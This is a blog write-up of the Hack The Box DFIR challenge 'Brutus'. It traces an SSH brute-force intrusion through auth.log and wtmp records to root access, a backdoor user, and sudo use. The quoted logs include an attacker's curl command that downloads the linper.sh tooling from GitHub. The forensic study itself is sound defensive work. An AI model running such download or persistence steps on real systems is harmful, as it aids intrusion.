---
slug: htb-sherlock-brutus
title: 'HTB Sherlock: Brutus'
authors: [cielo]
date: 2025-09-16 # 你可以修改成實際的寫作日期
tags: [security, hack-the-box, tutorial, dfir]
---

[Hack The Box](https://www.hackthebox.com/) is an online cybersecurity training platform that allows individuals to test and advance their skills in penetration testing, digital forensics, and incident response. The "Sherlocks" are a series of defensive challenges focused on digital forensics and incident response (DFIR).

This post covers the "Brutus" Sherlock, a scenario where we investigate a brute-force attack against a Confluence server's SSH service. We'll analyze logs to trace the attacker's activities, from initial access to privilege escalation and persistence.

## Getting Started

After downloading and unzipping `Brutus.zip`, we find three files:
*   `auth.log`: A log file from Unix-like systems that records user logins, authentication attempts, and other security-related events.
*   `wtmp`: A binary file that maintains a history of user logins and logouts.
*   `utmp.py`: A Python script to parse the binary `wtmp` file into a human-readable format.

## The Investigation

### T1: Attacker's IP Address
> Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Answer:** `65.2.161.68`

By examining `auth.log`, we can see a large volume of failed login attempts from the same IP address in a short period. This is a clear indicator of a brute-force attack.

```bash
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
... (many more attempts)
```

### T2: Compromised Username
> The bruteforce attempts were successful and the attacker gained access to an account on the server. What is the username of the account?

**Answer:** `root`

After numerous failed attempts, the logs show a successful password acceptance for the `root` user from the attacker's IP.

```bash
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

### T3: Manual Login Timestamp (UTC)
> Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

**Answer:** `2024-03-06 06:32:45 UTC`

To find the login time, we need to analyze the `wtmp` file. The challenge provides the `utmp.py` script to parse this binary file. Running `python3 utmp.py wtmp > wtmp.txt` gives us a readable version. In `wtmp.txt`, we find a login entry for the `root` user from the attacker's IP.

```text
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 14:32:45"	"387923"	"65.2.161.68"
```

The timestamp in `wtmp.txt` is `14:32:45`. However, the `auth.log` shows the successful authentication at `06:32:44`. This discrepancy is due to timezone differences. The `utmp.py` script uses `time.localtime()`, which converts the epoch time to the local timezone of the machine running the script. The `auth.log` timestamps are in UTC. The 8-hour difference (`14:32` vs `06:32`) suggests the `wtmp` file was parsed in a UTC+8 timezone. The correct UTC login time is shortly after the authentication time, which is `2024-03-06 06:32:45`.

### T4: Session Number
> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

**Answer:** `37`

Two successful `root` logins were observed from the attacker’s IP: one created **Session 34**, the other **Session 37**. Session 34 was a short-lived automated login, while Session 37 was the persistent, interactive session where the attacker executed commands.

:::note Why Session 34 Is Not the Correct Answer
* **Instantaneous Logout:** Session 34 was created and terminated in the same second (`06:31:40`), which is not consistent with human behavior.  
* **Tool Behavior:** Brute-force tools (e.g., Hydra, Medusa) often create such non-interactive logins to verify valid credentials, then disconnect immediately.
:::

```bash
# Session 34: Fleeting, automated login
Mar  6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 sshd[2411]: pam_unix(sshd:session): session closed for user root
Mar  6 06:31:40 systemd-logind[411]: Removed session 34.

# Session 37: Persistent, interactive session
Mar  6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.

# ... attacker activity followed (e.g., creation of 'cyberjunkie' user)
```

### T5: Persistence - New User
> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

**Answer:** `cyberjunkie`

A common persistence technique is to create a new user account. The `auth.log` records user management activities, and we can see the `useradd` command being used to create a new user.

```bash
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
```

### T6: MITRE ATT&CK ID
> What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Answer:** `T1136.001`

The attacker's action of creating a local user account for persistence maps to the MITRE ATT&CK framework. The specific technique is T1136: Create Account, and the sub-technique is T1136.001: Local Account. You can find more details on the MITRE ATT&CK website.

### T7: Session End Time
> What time did the attacker's first SSH session end according to auth.log?

**Answer:** `06:37:24` on March 6th.

We can find the end of the attacker's session by looking for log entries related to session 37 closing.

```bash
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

### T8: Sudo Command for Privilege Escalation
> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

After creating the `cyberjunkie` user and adding it to the `sudo` group, the attacker logged in with it and used `sudo` to execute commands with root privileges. The `auth.log` records `sudo` command usage, revealing that the attacker downloaded a privilege escalation script named `linper.sh` from GitHub.

```bash
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```